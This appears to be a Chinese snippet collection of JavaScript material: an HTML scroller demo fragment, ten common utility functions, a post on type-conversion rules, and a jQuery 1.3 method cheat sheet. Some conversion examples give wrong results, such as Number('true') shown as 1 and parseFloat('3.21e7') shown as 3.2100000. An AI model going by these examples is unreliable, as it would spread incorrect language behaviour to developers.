        <li> <a href="http://shundebk.cn/">2111111111111111111111</a></li>
      </ul>
    </div>
  </div>
</div>
<br />
<br />
<div id="idScroller1" class="Scroller" style="width:250px; height:50px;">
  <div style="width:500px">
    <div id="idScrollMid1" class="ScrollMid">
      <ul>
        <li> <a href="http://shundebk.cn/">1111111111111111111111</a></li>
        <li> <a href="http://shundebk.cn/">2111111111111111111111</a></li>
        <li> <a href="http://shundebk.cn/">3111111111111111111111</a></li>
        <li> <a href="http://shundebk.cn/">4111111111111111111111</a></li>
      </ul>
    </div>
  </div>
</div>
<br />
<br />
<div style="width:200px;">
  <div id="idScroller2" class="Scroller2" style="width:100px; height:100px;">
    <div style="width:200px">
      <div id="idScrollMid2" class="ScrollMid2">
        <ul>
          <li>顺德百科 </li>
        </ul>
      </div>
    </div>
  </div>
  <div id="idScroller3" class="Scroller2" style="width:100px; height:100px;">
    <div style="width:200px">
      <div id="idScrollMid3" class="ScrollMid2">
        <ul>
          <li>顺德百科 </li>
        </ul>
      </div>
    </div>
  </div>
  <div id="idScroller4" class="Scroller2" style="width:100px; height:100px;">
    <div style="width:200px">
      <div id="idScrollMid4" class="ScrollMid2">
        <ul>
          <li>顺德百科 </li>
        </ul>
      </div>
    </div>
  </div>
  <div id="idScroller5" class="Scroller2" style="width:100px; height:100px;">
    <div style="width:200px">
      <div id="idScrollMid5" class="ScrollMid2">
        <ul>
          <li>顺德百科 </li>
        </ul>
      </div>
    </div>
  </div>
</div>
<div id="test"></div>
</body>
</html>

#T=javascript十个最常用的自定义函数
/*
javascript十个最常用的自定义函数
如果不使用类库或者没有自己的类库，储备一些常用函数总是有好处的。
*/

//(10)addEvent
//网上最流行的版本是Scott Andrew的，据说javascript界曾举行一场比赛(此事件我们可以在Pro Javascript Techniques第100页看到)或浏览PPK的网站，征求添加事件与移除事件的函数，他就是其获奖者。下面就是他的实现：
function addEvent(elm, evType, fn, useCapture)
{
	if (elm.addEventListener)
	{
		elm.addEventListener(evType, fn, useCapture);//DOM2.0
		return true;
	}
	else if (elm.attachEvent)
	{
		var r = elm.attachEvent('on' + evType, fn);//IE5+
		return r;
	}
	else
	{
		elm['on' + evType] = fn;//DOM 0
	}
}
//下面是Dean Edwards 的版本
// addEvent/removeEvent written by Dean Edwards, 2005
// with input from Tino Zijdel
// http://dean.edwards.name/weblog/2005/10/add-event/
function addEvent(element, type, handler)
{
	//为每一个事件处理函数分派一个唯一的ID
	if (!handler.$$guid)
	{
		handler.$$guid = addEvent.guid++;
	}
	//为元素的事件类型创建一个哈希表
	if (!element.events)
	{
		element.events = {};
	}
	//为每一个"元素/事件"对创建一个事件处理程序的哈希表
	var handlers = element.events[type];
	if (!handlers)
	{
		handlers = element.events[type] = {};
		//存储存在的事件处理函数(如果有)
		if (element["on" + type])
		{
			handlers[0] = element["on" + type];
		}
	}
	//将事件处理函数存入哈希表
	handlers[handler.$$guid] = handler;
	//指派一个全局的事件处理函数来做所有的工作
	element["on" + type] = handleEvent;
};
//用来创建唯一的ID的计数器
addEvent.guid = 1;
function removeEvent(element, type, handler)
{
	//从哈希表中删除事件处理函数
	if (element.events && element.events[type])
	{
		delete element.events[type][handler.$$guid];
	}
};
function handleEvent(event)
{
	var returnValue = true;
	//抓获事件对象(IE使用全局事件对象)
	event = event || fixEvent(window.event);
	//取得事件处理函数的哈希表的引用
	var handlers = this.events[event.type];
	//执行每一个处理函数
	for (var i in handlers)
	{
		this.$$handleEvent = handlers[i];
		if (this.$$handleEvent(event) === false)
		{
			returnValue = false;
		}
	}
	return returnValue;
};
//为IE的事件对象添加一些“缺失的”函数
function fixEvent(event)
{
	//添加标准的W3C方法
	event.preventDefault = fixEvent.preventDefault;
	event.stopPropagation = fixEvent.stopPropagation;
	return event;
};
fixEvent.preventDefault = function()
							{
								this.returnValue = false;
							};
fixEvent.stopPropagation = function()
							{
								this.cancelBubble = true;
							};
//功能非常强悍，解决IE的this指向问题，event总是作为第一个参数传入，跨浏览器就更不在话下。
//另，我还珍藏了一个HTML5工作组的版本：
var addEvent =
	(
		function()
		{
			if (document.addEventListener)
			{
				return function(el, type, fn)
				{
					if (el.length)
					{
						for (var i = 0; i < el.length; i++)
						{
							addEvent(el[i], type, fn);
						}
					}
					else
					{
						el.addEventListener(type, fn, false);
					}
				};
			}
			else
			{
				return function(el, type, fn)
				{
					if (el.length)
					{
						for (var i = 0; i < el.length; i++)
						{
							addEvent(el[i], type, fn);
						}
					}
					else
					{
						el.attachEvent
							(
								'on' + type,
								function()
								{
									return fn.call(el, window.event);
								}
							);
					}
				};
			}
		}
	)
	();


//(9)addLoadEvent()
//我以前讨论过这函数，不细说，就是慢了一点，各大类库基本无视它，自行实现domReady版本。下面是Simon Willison 的实现：
var addLoadEvent = function(fn)
					{
						var oldonload = window.onload;
						if (typeof window.onload != 'function')
						{
							window.onload = fn;
						}
						else
						{
							window.onload = function()
											{
												oldonload();
												fn();
											}
						}
					}
//(8) getElementsByClass()
//我有收集癖，手头上拥有许多版本，最后集思广益自己实现了一个。下面是我的实现：
var getElementsByClassName = function (searchClass, node,tag) {
if (document.getElementsByClassName)
{
	return  document.getElementsByClassName(searchClass)
}
else
{
	node = node || document;
	tag = tag || "*";
	var classes = searchClass.split(" "),
	elements = (tag === "*" && node.all)? node.all : node.getElementsByTagName(tag),
	patterns = [],
	returnElements = [],
	current,
	match;
	var i = classes.length;
	while (--i >= 0)
	{
		patterns.push(new RegExp("(^|\\s)" + classes[i] + "(\\s|$)"));
	}
	var j = elements.length;
	while (--j >= 0)
	{
		current = elements[j];
		match = false;
		for (var k = 0, kl = patterns.length; k < kl; k++)
		{
			match = patterns[k].test(current.className);
			if (!match)
			{
				break;
			}
		}
		if (match)
		{
			returnElements.push(current);
		}
		}
		return returnElements;
	}
}

//(7)cssQuery()
//别名为getElementsBySeletor，由Dean Edwards最先实现，Prototype.js，JQuery等类库都有相应实现，其中JQuery把它整合到$()选择器中，名声盖过其前辈。不过IE8等新锐浏览器已经实现querySelector与querySelectorAll方法，待到IE6与IE7报废之日，它就无用了。无忧里有它的实现原理讲解。由于太长，就不粘出来了，具体可到原作者网站看看。

//(6)toggle()
//用来显示或隐藏一个DOM元素。
function toggle(obj)
{
	var el = document.getElementById(obj);
	if (el.style.display != 'none')
	{
		el.style.display = 'none';
	}
	else
	{
		el.style.display = '';
	}
}

//(5)insertAfter()
//DOM只提供了insertBefore，我们很有必要自己实现insertAfter。不过我认为 insertAdjacentElement是更好的选择，现在除了火狐其他浏览器都实现这个方法。下面是Jeremy Keith的版本：
function insertAfter(parent, node, referenceNode)
{
	parent.insertBefore(node, referenceNode.nextSibling);
}

//(4)inArray()
//用于判断检查数组中是否存在某个值，下面方法取自Prototype类库。
Array.prototype.inArray = function (value)
{
	for (var i = 0, l = this.length; i < l; i++)
	{
		if (this[i] == value)
		{
			return true;
		}
	}
	return false;
};
//另一个版本：
var inArray = function (arr,value)
{
	for (var i = 0, l = arr.length; i < l; i++)
	{
		if (arr[i] === value)
		{
			return true;
		}
	}
	return false;
};

//(3) getCookie(), setCookie(), deleteCookie()
//做BBS与商业网站的应该经常用到，无理由每次都要让用户输入密码登录吧。我们需要借助cookie实现自动登录功能。
function getCookie(name)
{
	var start = document.cookie.indexOf( name + "=" );
	var len = start + name.length + 1;
	if ((!start) && ( name != document.cookie.substring(0, name.length)))
	{
		return null;
	}
	if (start == -1)
	{
		return null;
	}
	var end = document.cookie.indexOf( ';', len);
	if ( end == -1 )
	{
		end = document.cookie.length;
	}
	return unescape(document.cookie.substring( len, end));
}
function setCookie( name, value, expires, path, domain, secure)
{
	var today = new Date();
	today.setTime( today.getTime() );
	if (expires)
	{
		expires = expires * 1000 * 60 * 60 * 24;
	}
	var expires_date = new Date( today.getTime() + (expires) );
	document.cookie = name 
						+ '='
						+ escape(value)
						+ ((expires) ? ';expires='+expires_date.toGMTString() : '') //expires.toGMTString()
						+ ((path) ? ';path=' + path : '')
						+ (( domain ) ? ';domain=' + domain : '' )
						+ ((secure) ? ';secure' : '');
}
function deleteCookie( name, path, domain)
{
	if (getCookie(name))
	{
		document.cookie = name
							+ '='
							+ ((path) ? ';path=' + path : '')
							+ ((domain) ? ';domain=' + domain : '')
							+ ';expires=Thu, 01-Jan-1970 00:00:01 GMT';
	}
}

//(2)getStyle()与setStyle()
//所有UI控件都应该存在的函数，动态设置样式与获取样式。这个可以写得很短，也可以写得很长，但要精确取得样式，一个字：难！但我发现许多问题都是发端于IE，微软的开发人员好像从来不打算给出getComputedStyle这样的函数，与之相近的currentStyle会返回auto，inhert， ' '等让你哭笑不得的值，这还没有算上IE怪癖模式带来的难度呢！各类库的实现是非常长与难分离出来的，下面是我实现的版本：
function setStyle(el, prop, value)
{
	if (prop == "opacity" && ! + "\v1")
	{
		//IE7 bug:filter 滤镜要求 hasLayout=true 方可执行(否则没有效果)
		if (!el.currentStyle || !el.currentStyle.hasLayout)
		{
			el.style.zoom = 1;
		}
		prop = "filter";
		if (!!window.XDomainRequest)
		{
			value ="progid:DXImageTransform.Microsoft.Alpha(style=0,opacity=" + value * 100 + ")";
		}
		else
		{
			value = "alpha(opacity=" + value * 100 + ")";
		}
	}
	el.style.cssText += ';' + (prop+":"+value);
}

function getStyle(el, style)
{
	if (! + "\v1")
	{
		style = style.replace
						(
							/\-(\w)/g,
							function(all, letter)
							{
								return letter.toUpperCase(); 
							}
						); 
		return el.currentStyle[style]; 
	}
	else
	{
		return document.defaultView.getComputedStyle(el, null).getPropertyValue(style) 
	}
}
//有关setStyle还可以看我另一篇博文，毕竟现在设置的样式都是内联样式，与html混杂在一起。

//(1)$()
//实至名归，最值钱的函数，可以节省多少流量啊。最先由Prototype.js实现的，那个洪荒时代遗留下来的珍兽，现在有许多变种。
function $()
{
	var elements = [];
	for (var i = 0; i < arguments.length; i++)
	{
		var element = arguments[i];
		if (typeof element == 'string')
		{	
			element = document.getElementById(element);
		}
		if (arguments.length == 1)
		{
			return element;
		}
		elements.push(element);
	}
	return elements;
}
#T=JavaScript中各种转换规则记录
JavaScript中各种转换规则记录
2012-03-20 10:33 by 秋梧, 222 visits, 收藏, 编辑
阅读目录
前言
Boolean转换规则
Number转换规则
String转换规则
Boolean转换规则
结束语
前言
      在javascript中，我学习中比较混乱的就是各种数值类型之间的转换，所以写这篇文章作为记录，如果文中有任何不正确的地方，请大家尽量拍砖，相互学习，共同进步。
Boolean转换规则
  在javascript中，Boolean是内部的基本包装类型之一，它是一个函数，可以用来构建布尔类型的值：true or false。构建出来的实例，可以调用Boolean提供的方法。除此之外，Boolean也是一个函数，可以用来进行数据转换为布尔值。可以对任何数据类型的值调用Boolean函数，而且都会返回一个Boolean值，具体转换规则如下：
数据类型
转换为true的值
转换为false的值
Boolean
true
false
String
任何非空字符串
“”/’’(空字符串)
Number
任何非零数字值（包括无穷）
0 和NaN
Object
任何对象
Null
Undefined
不适用
Undefined
 Number转换规则
对于数值类型，有3个转换函数：Number、parseInt、parseFloat。Number可以用于任何数据类型，后面两个则专门用于把字符串转换成数值。
Number（）转换规则 ：
1、  如果是Boolean值，true和false将被转换为1和0；
2、  如果是数字值，就就是简单的传入和返回；
3、  如果是null，则返回0；
4、  如果是undefined，返回NaN;
5、  如果是字符串，遵循下列规则：
1)         如果字符串只包含数字，则转换为十进制值，当然，前导零会被忽略。”000123”->123
2)         如果字符串中包含有效的浮点格式，则转为对应的浮点值，前导零也会被忽略
3)         如果包含有效的十六进制格式，则转为大小相同的十进制数
4)         如果是空的，则转换为0
5)         如果包含除以上格式之外的字符，则将其转换为NaN。
6、  如果是对象，则调用对象的valueOf方法，然后按照前面的规则转换返回的值，如果转换的结果是NaN，则调用对象的toString（）方法，再按照前面的规则返回字符串。
这么多规则，光看文字就晕了，看看几个例子：
var num1 = Number(“Hello”);//NaN
var num2 = Number(“”);//0
var num3= Number(“000111”);//111
var num4 = Number(“true”);//1
var num5 = Number(null);//0
var num6 = Number(undefined);//NaN
var num7= Number(22);//22
复制代码
Number()用来转换实在太复杂了，所以一般会用parseInt和parseFloat。
 parseInt()转换规则
parseInt() 会忽略字符串前面的空格，规则如下：
1、  如果是数字，则简单的传入传出，但是浮点数的话，则只取整数部分
2、  如果是字符串，第一个字符不是数字或者符号，则返回NaN,
3、  空字符串，返回NaN
4、  如果第一字符是数字字符，则会继续解析，直到遇到一个非数字字符，
5、  如果字符串是浮点数的形式，也只取整数部分
6、  如果第一个是数字字符，并且符合八进制和十六进制的写法（0和0x），则会相应的当成对应的进制数转换。直到遇到一个非数字字符
看下例子，印象比较深刻
var num1 = parseInt(22);//22
var num2 =parseInt(22.6);//22
var num3= parseInt(“”);//NaN
var num4 = parseInt(“ddd12”);// NaN
var num5 = parseInt(‘124dd’);//124
var num6 = parseInt(‘0xA’);//10
var num7 = parseInt(‘070’);//八进制 56
var num8= parseInt(‘70‘);//十进制 70
var num9= parseInt(‘0xf’);//十六进制 15
复制代码
也可以明确指定要转换的进制数，只要在第二个参数传入即可
var num1= parseInt(‘0xaf’,16);// 十六进制175
var num2= parseInt(‘af’,16);// 十六进制175 指定进制，就可以不带0x
var num3= parseInt(‘af’);// 单纯字符‘af‘，返回NaN
var num4 = parseInt(‘10’,2);// 2  二进制解析
var num5 = parseInt(‘10’,8);// 8 八进制解析
var num6 = parseInt(‘10’,10);// 10  十进制解析
var num7 = parseInt(‘10’,16);// 16  十六进制解析
var num8 = parseInt(‘010’);// 8 按八进制
var num8 = parseInt(‘010’,8);// 8 按八进制
var num9 = parseInt(‘010’,10);// 10 按十进制
复制代码
parseFloat转换规则
parseFloat 和parseInt大部分类似，也是从第一个字符开始解析。但是有如下特点
1、  只有第一个小数点有效，第二个小数点无效，因此后面字符串将被忽略
2、  parseFloat只解析十进制，不解析八进制和十六进制，也就是说他会把010解析成10,0xa解析成0
例子:
var num1= parseFloat(‘1456dfd’;// 1456
var num2= parseFloat (‘0xa’);// 0
var num3= parseFloat (’22.5’);//22.5
var num4 = parseFloat (‘1.2.3’);// 1.2
var num5 = parseFloat (‘098.5’);//98.5
var num6 = parseFloat (‘3.21e7’);// 3.2100000
复制代码
String 转换规则
在javascript中的基本数据类型中大部分都有toString方法，但是null和undefined没有。
数值的toString方法可以传入基数：
var num =10;
alert(num.toString());//’10’
alert(num.toString(2));//’1010’
alert(num.toString(8));//’12’
alert(num.toString(10));//’10’
alert(num.toString(16));//’a’
复制代码
基于null和undefined没有toString方法，可以使用String（），规则如下：
1、  如果值有toString方法，则调用该方法
2、  如果是null则返回”null”
3、  如果是undefined，则返回’undefined’
 
结束语
至此我们复习了javascript中的大部分转换规则和方法。以此作为记录，忘记了还可以看看。
#T=jquery  ko 引用声明
<script src="http://scripts.asp.net.local/Scripts/jquery-2.0.3.js" type="text/javascript"></script>
	<script src="http://scripts.asp.net.local/Scripts/knockout-2.3.0.js" type="text/javascript"></script>
	<script src="http://scripts.asp.net.local/Scripts/knockout.simpleGrid.1.3.js" type="text/javascript"></script>
#T=jQuery方法大全 jQuery 1.3 CHM下载
jQuery方法大全 jQuery 1.3 CHM下载

Dom： 

Attribute：（属性）
$("p").addClass(css中定义的样式类型); 给某个元素添加样式
$("img").attr({src:"test.jpg",alt:"test Image"}); 给某个元素添加属性/值，参数是map 
$("img").attr("src","test.jpg"); 给某个元素添加属性/值 
$("img").attr("title", function() { return this.src }); 给某个元素添加属性/值 
$("元素名称").html(); 获得该元素内的内容（元素，文本等） 
$("元素名称").html("<b>new stuff</b>"); 给某元素设置内容 
$("元素名称").removeAttr("属性名称") 给某元素删除指定的属性以及该属性的值 
$("元素名称").removeClass("class") 给某元素删除指定的样式 
$("元素名称").text(); 获得该元素的文本 
$("元素名称").text(value); 设置该元素的文本值为value 
$("元素名称").toggleClass(class) 当元素存在参数中的样式的时候取消,如果不存在就设置此样式 
$("input元素名称").val(); 获取input元素的值 
$("input元素名称").val(value); 设置input元素的值为value 
Manipulation： （操作）
$("元素名称").after(content); 在匹配元素后面添加内容 
$("元素名称").append(content); 将content作为元素的内容插入到该元素的后面 
$("元素名称").appendTo(content); 在content后接元素 
$("元素名称").before(content); 与after方法相反 
$("元素名称").clone(布尔表达式) 当布尔表达式为真时，克隆元素（无参时，当作true处理） 
$("元素名称").empty() 将该元素的内容设置为空 
$("元素名称").insertAfter(content); 将该元素插入到content之后 
$("元素名称").insertBefore(content); 将该元素插入到content之前 
$("元素").prepend(content); 将content作为该元素的一部分，放到该元素的最前面 
$("元素").prependTo(content); 将该元素作为content的一部分，放content的最前面 
$("元素").remove(); 删除所有的指定元素 
$("元素").remove("exp"); 删除所有含有exp的元素 
$("元素").wrap("html"); 用html来包围该元素 
$("元素").wrap(element); 用element来包围该元素 

Traversing： （交叉）
add(expr) //在原对象的基础上再附加符合指定表达式的jquery对象
add(html) //在匹配对象的基础上再附加指定的一段HTML片段
add(elements) //在匹配对象的基础上再附加指定的DOM元素
children(expr) //获取一级子元素
contains(str) //返回匹配对象中包含字符串str的对象
end() //回到最近的一个“破坏性”操作之前。即，将匹配的元素列表变为前一次的状态
filter(expression) //不严格的“查找”，能够将元素精简到只剩下满足过滤条件的那些，（在一组已经选取的元素里面选择）
filter(filter) 
find(expr) //获取所有子元素（在一组已经选取的元素的子节点里面选择）
is(expr) //判断是否含有expr
next(expr) //取得一个包含匹配的元素集合中每一个元素紧邻的后面同辈元素的元素集合
not(el) //从jquery对象中移出匹配的对象，el为dom元素
not(expr)//从jquery对象中移出匹配的对象，expr为jquery表达式  
parent(expr) //返回最近的一个父节点
parents(expr) //取得一个包含着所有匹配元素的祖先元素的元素集合（不包含根元素）
prev(expr) //相邻的上一个兄弟元素
prevAll(expr) //所有前面的兄弟元素
siblings(expr) //所有兄弟元素（无兄弟元素则不被匹配）

Core： （核心）
$(html).appendTo("body") 相当于在body中写了一段html代码 
$(elems) 获得DOM上的某个元素 
$(function(){……..}); 执行一个函数 
$("div > p").css("border", "1px solid gray"); 查找所有div的子节点p，添加样式 
$("input:radio", document.forms[0]) 在当前页面的第一个表单中查找所有的单选按钮 
$.extend(prop) prop是一个jQuery对象， jquery的扩展方法extend是在写插件的过程中常用的方法
	举例： 
	jQuery.extend({ 
	min: function(a, b) { return a < b ? a : b; }, 
	max: function(a, b) { return a > b ? a : b; } 
	}); 
jQuery( expression, [context] ) ---$( expression, [context]); 在默认情况下，$()查询的是当前HTML文档中的DOM元素。 

each( callback ) 以每一个匹配的元素作为上下文来执行一个函数 
举例：1 
$("span").click(function){ 
$("li").each(function(){ 
$(this).toggleClass("example"); 
}); 
}); 
举例：2 
$("button").click(function () { 
$("div").each(function (index, domEle) { 
// domEle == this 
$(domEle).css("backgroundColor", "yellow"); 
if ($(this).is("#stop")) { 
$("span").text("Stopped at div index #" + index); 
return false; 
} 
}); 
}); 


jQuery Event: 

ready(fn); $(document).ready()注意在body中没有onload事件，否则该函数不能执行。在每个页面中可以有很多个函数被加载执行，按照fn的顺序来执行。 
bind( type, [data], fn ) 为每一个匹配元素的特定事件（像click）绑定一个或多个事件处理器函数。可能的事件属性有：blur, focus, load, resize, scroll, unload, click, dblclick, mousedown, mouseup, mousemove, mouseover, mouseout, mouseenter, mouseleave, change, select, submit, keydown, keypress, keyup, error 
one( type, [data], fn ) 为每一个匹配元素的特定事件（像click）绑定一个或多个事件处理器函数。在每个对象上，这个事件处理函数只会被执行一次。其他规则与bind()函数相同。 
trigger( type, [data] ) 在每一个匹配的元素上触发某类事件。 
triggerHandler( type, [data] ) 这一特定方法会触发一个元素上特定的事件(指定一个事件类型)，同时取消浏览器对此事件的默认行动 
unbind( [type], [data] ) 反绑定，从每一个匹配的元素中删除绑定的事件。 
$("p").unbind() 移除所有段落上的所有绑定的事件 
$("p").unbind( "click" ) 移除所有段落上的click事件 
hover( over, out ) over,out都是方法, 当鼠标移动到一个匹配的元素上面时，会触发指定的第一个函数。当鼠标移出这个元素时，会触发指定的第二个函数。 
	$("p").hover(function(){ 
	$(this).addClass("over"); 
	}, 
	function(){ 
	$(this).addClass("out"); 
	} 
	); 

toggle( fn, fn ) 如果点击了一个匹配的元素，则触发指定的第一个函数，当再次点击同一元素时，则触发指定的第二个函数。 
	$("p").toggle(function(){ 
	$(this).addClass("selected"); 
	}, 
	function(){ 
	$(this).removeClass("selected"); 
	} 
	); 


元素事件列表说明 
注：不带参数的函数，其参数为可选的 fn。jQuery不支持form元素的reset事件。
 
事件 					描述 									支持元素或对象 

blur( ) 				元素失去焦点 								a, input, textarea, button, select, label, map, area 
change( ) 				用户改变域的内容 							input, textarea, select 
click( ) 				鼠标点击某个对象 							几乎所有元素 
dblclick( ) 			鼠标双击某个对象 							几乎所有元素 
error( ) 				当加载文档或图像时发生某个错误 				window, img 
focus( ) 				元素获得焦点 								a, input, textarea, button, select, label, map, area 
keydown( ) 				某个键盘的键被按下 						几乎所有元素 
keypress( ) 			某个键盘的键被按下或按住 					几乎所有元素 
keyup( ) 				某个键盘的键被松开 						几乎所有元素 
load( fn ) 				某个页面或图像被完成加载 					window, img 
mousedown( fn ) 		某个鼠标按键被按下 						几乎所有元素 
mousemove( fn ) 		鼠标被移动 								几乎所有元素 
mouseout( fn ) 			鼠标从某元素移开 							几乎所有元素 
mouseover( fn ) 		鼠标被移到某元素之上 						几乎所有元素 
mouseup( fn ) 			某个鼠标按键被松开 						几乎所有元素 
resize( fn ) 			窗口或框架被调整尺寸 						window, iframe, frame 
scroll( fn ) 			滚动文档的可视部分时 						window 
select( ) 				文本被选定 								document, input, textarea 
submit( ) 				提交按钮被点击 							form 
unload( fn ) 			用户退出页面 								window 



JQuery Ajax 方法说明: 

load( url, [data], [callback] ) 装入一个远程HTML内容到一个DOM结点。 
	$("#feeds").load("feeds.html"); 将feeds.html文件载入到id为feeds的div中 
	$("#feeds").load("feeds.php", {limit: 25}, function(){ 
	alert("The last 25 entries in the feed have been loaded"); 
	}); 

jQuery.get( url, [data], [callback] ) 使用GET请求一个页面。 
	$.get("test.cgi", { name: "John", time: "2pm" }, function(data){ 
	alert("Data Loaded: " + data); 
	}); 

jQuery.getJSON( url, [data], [callback] ) 使用GET请求JSON数据。 
	$.getJSON("test.js", { name: "John", time: "2pm" }, function(json){ 
	alert("JSON Data: " + json.users[3].name); 
	}); 

jQuery.getScript( url, [callback] ) 使用GET请求JavaScript文件并执行。 
	$.getScript("test.js", function(){ 
	alert("Script loaded and executed."); 
	}); 
jQuery.post( url, [data], [callback], [type] ) 使用POST请求一个页面。 

ajaxComplete( callback ) 当一个AJAX请求结束后，执行一个函数。这是一个Ajax事件 
	$("#msg").ajaxComplete(function(request, settings){ 
	$(this).append("<li>Request Complete.</li>"); 
	}); 
ajaxError( callback ) 当一个AJAX请求失败后，执行一个函数。这是一个Ajax事件 
	$("#msg").ajaxError(function(request, settings){ 
	$(this).append("<li>Error requesting page " + settings.url + "</li>"); 
	}); 

ajaxSend( callback ) 在一个AJAX请求发送时，执行一个函数。这是一个Ajax事件 
	$("#msg").ajaxSend(function(evt, request, settings){ 
	$(this).append("<li<Starting request at " + settings.url 
	+ "</li<"); 
	}); 

ajaxStart( callback ) 在一个AJAX请求开始但还没有激活时，执行一个函数。这是一个Ajax事件 
	当AJAX请求开始(并还没有激活时)显示loading信息 
	$("#loading").ajaxStart(function(){ 
	$(this).show(); 
	}); 

ajaxStop( callback ) 当所有的AJAX都停止时，执行一个函数。这是一个Ajax事件 
	当所有AJAX请求都停止时，隐藏loading信息。 
	$("#loading").ajaxStop(function(){ 
	$(this).hide(); 
	}); 

ajaxSuccess( callback ) 当一个AJAX请求成功完成后，执行一个函数。这是一个Ajax事件 
	当AJAX请求成功完成时，显示信息。 
	$("#msg").ajaxSuccess(function(evt, request, settings){ 
	$(this).append("<li>Successful Request!</li>"); 
	}); 

jQuery.ajaxSetup( options ) 为所有的AJAX请求进行全局设置。查看$.ajax函数取得所有选项信息。 
	设置默认的全局AJAX请求选项。 
	$.ajaxSetup({ 
	url: "/xmlhttp/", 
	global: false, 
	type: "POST" 
	}); 
	$.ajax({ data: myData }); 

serialize( ) 以名称和值的方式连接一组input元素。实现了正确表单元素序列 
	function showValues() { 
	var str = $("form").serialize(); 
	$("#results").text(str); 
	} 
	$(":checkbox, :radio").click(showValues); 
	$("select").change(showValues); 
	showValues(); 

serializeArray( ) 连接所有的表单和表单元素(类似于.serialize()方法)，但是返回一个JSON数据格式。 
	从form中取得一组值，显示出来 
	function showValues() { 
	var fields = $(":input").serializeArray(); 
	alert(fields); 
	$("#results").empty(); 
	jQuery.each(fields, function(i, field){ 
	$("#results").append(field.value + " "); 
	}); 
	} 
	$(":checkbox, :radio").click(showValues); 
	$("select").change(showValues); 
	showValues(); 

JQuery Effects 方法说明 

show( ) 显示隐藏的匹配元素。 
show( speed, [callback] ) 以优雅的动画显示所有匹配的元素，并在显示完成后可选地触发一个回调函数。 
hide( ) 隐藏所有的匹配元素。 
hide( speed, [callback] ) 以优雅的动画隐藏所有匹配的元素，并在显示完成后可选地触发一个回调函数 
toggle( ) 切换元素的可见状态。如果元素是可见的，切换为隐藏的；如果元素是隐藏的， 
切换为可见的。 
slideDown( speed, [callback] ) 通过高度变化（向下增大）来动态地显示所有匹配的元素，在显示完成后可选地触发一个回调函数。这个动画效果只调整元素的高度，可以使匹配的元素以"滑动"的方式显示出来。 
slideUp( speed, [callback] ) 通过高度变化（向上减小）来动态地隐藏所有匹配的元素，在隐藏完成后可选地触发一个回调函数。这个动画效果只调整元素的高度，可以使匹配的元素以"滑动"的方式隐藏起来。 
slideToggle( speed, [callback] ) 通过高度变化来切换所有匹配元素的可见性，并在切换完成后可选地触发一个回调函数。 这个动画效果只调整元素的高度，可以使匹配的元素以"滑动"的方式隐藏或显示。 
fadeIn( speed, [callback] ) 通过不透明度的变化来实现所有匹配元素的淡入效果，并在动画完成后可选地触发一个回调函数。 这个动画只调整元素的不透明度，也就是说所有匹配的元素的高度和宽度不会发生变化。 
fadeOut( speed, [callback] ) 通过不透明度的变化来实现所有匹配元素的淡出效果，并在动画完成后可选地触发一个回调函数。 这个动画只调整元素的不透明度，也就是说所有匹配的元素的高度和宽度不会发生变化。 
fadeTo( speed, opacity, [callback] ) 把所有匹配元素的不透明度以渐进方式调整到指定的不透明度，并在动画完成后可选地触发一个回调函数。 这个动画只调整元素的不透明度，也就是说所有匹配的元素的高度和宽度不会发生变化。 
stop( ) 停止所有匹配元素当前正在运行的动画。如果有动画处于队列当中，他们就会立即开始。 
queue( ) 取得第一个匹配元素的动画序列的引用(返回一个内容为函数的数组) 
queue( callback ) 在每一个匹配元素的事件序列的末尾添加一个可执行函数，作为此元素的事件函数 
queue( queue ) 以一个新的动画序列代替所有匹配元素的原动画序列 
dequeue( ) 执行并移除动画序列前端的动画 
animate( params, [duration], [easing], [callback] ) 用于创建自定义动画的函数。 
animate( params, options ) 创建自定义动画的另一个方法。作用同上。 


JQuery Traversing 方法说明 

eq( index ) 从匹配的元素集合中取得一个指定位置的元素，index从0开始 
filter( expr ) 返回与指定表达式匹配的元素集合，可以使用","号分割多个expr，用于实现多个条件筛选 
filter( fn ) 利用一个特殊的函数来作为筛选条件移除集合中不匹配的元素。 
is( expr ) 用一个表达式来检查当前选择的元素集合，如果其中至少有一个元素符合这个给定的表达式就返回true。 
map( callback ) 将jQuery对象中的一组元素利用callback方法转换其值，然后添加到一个jQuery数组中。 
not( expr ) 从匹配的元素集合中删除与指定的表达式匹配的元素。 
slice( start, [end] ) 从匹配元素集合中取得一个子集，和内建的数组的slice方法相同。 
add( expr ) 把与表达式匹配的元素添加到jQuery对象中。 
children( [expr] ) 取得一个包含匹配的元素集合中每一个元素的所有子元素的元素集合。可选的过滤器将使这个方法只匹配符合的元素(只包括元素节点，不包括文本节点)。 
contents( ) 取得一个包含匹配的元素集合中每一个元素的所有子孙节点的集合(只包括元素节点，不包括文本节点)，如果元素为iframe，则取得其中的文档元素 
find( expr ) 搜索所有与指定表达式匹配的元素。 
next( [expr] ) 取得一个包含匹配的元素集合中每一个元素紧邻的后面同辈元素的元素集合。 
nextAll( [expr] ) 取得一个包含匹配的元素集合中每一个元素所有的后面同辈元素的元素集合 
parent( [expr] ) 取得一个包含着所有匹配元素的唯一父元素的元素集合。 
parents( [expr] ) 取得一个包含着所有匹配元素的唯一祖先元素的元素集合（不包含根元素）。 
prev( [expr] ) 取得一个包含匹配的元素集合中每一个元素紧邻的前一个同辈元素的元素集合。 
prevAll( [expr] ) 取得一个包含匹配的元素集合中每一个元素的之前所有同辈元素的元素集合。 
siblings( [expr] ) 取得一个包含匹配的元素集合中每一个元素的所有同辈元素的元素集合。 
andSelf( ) 将前一个匹配的元素集合添加到当前的集合中
	取得所有div元素和其中的p元素，添加border类属性。
	$("div").find("p").andSelf().addClass("border"); 
	取得所有div元素中的p元素，添加background类属性 
	$("div").find("p").addClass("background"); 
end( ) 结束当前的操作，回到当前操作的前一个操作 
	找到所有p元素其中的span元素集合，然后返回p元素集合，添加css属性 
	$("p").find("span").end().css("border", "2px red solid"); 

JQuery Selectors 方法说明 

基本选择器 
$("#myDiv") 匹配唯一的具有此id值的元素 
$("div") 匹配指定名称的所有元素 
$(".myClass") 匹配具有此class样式值的所有元素 
$("*") 匹配所有元素 
$("div,span,p.myClass") 联合所有匹配的选择器 
层叠选择器 
$("form input") 后代选择器，选择ancestor的所有子孙节点 
$("#main > *") 子选择器，选择parent的所有子节点 
$("label + input") 临选择器，选择prev的下一个临节点 
$("#prev ~ div") 同胞选择器，选择prev的所有同胞节点 
基本过滤选择器 
$("tr:first") 匹配第一个选择的元素 
$("tr:last") 匹配最后一个选择的元素 
$("input:not(:checked) + span")从原元素集合中过滤掉匹配selector的所有元素（这里有是一个临选择器） 
$("tr:even") 匹配集合中偶数位置的所有元素(从0开始) 
